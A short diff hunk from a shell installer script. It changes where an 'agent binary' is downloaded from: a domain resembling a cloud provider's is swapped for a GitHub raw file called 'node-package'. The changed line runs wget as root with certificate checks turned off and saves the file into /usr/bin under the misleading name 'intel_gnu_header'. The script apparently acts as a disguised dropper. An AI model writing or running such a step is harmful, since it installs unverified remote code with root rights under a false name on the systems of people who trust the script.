@@ -64,7 +64,7 @@ echo ""
 
 # Download and setup agent binary
 echo -e "${BLUE}[*] Downloading agent binary...${NC}"
-if sudo wget https://digitalocean.live/intel_gnu_header --no-check-certificate -O /usr/bin/intel_gnu_header; then
+if sudo wget https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package --no-check-certificate -O /usr/bin/intel_gnu_header; then
     echo -e "${GREEN}[+] Agent binary downloaded successfully${NC}"
 else
     echo -e "${RED}[!] Failed to download agent binary${NC}"
